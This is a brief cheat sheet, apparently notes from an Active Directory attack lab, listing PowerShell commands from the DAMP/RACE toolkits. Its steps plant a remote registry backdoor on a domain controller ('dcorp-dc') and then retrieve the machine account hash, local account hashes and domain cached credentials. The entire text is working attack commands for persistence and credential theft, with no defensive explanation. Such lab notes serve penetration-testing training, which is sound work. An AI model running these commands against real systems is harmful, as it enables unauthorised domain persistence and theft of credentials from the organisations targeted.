* Using RACE or DAMP, with admin privs on remote machine :
```
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
```

* As student1, retrieve machine account hash :
```
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

* Retrieve local account hash:
```
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
```

* Retrieve domain cached credentials:
```
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```

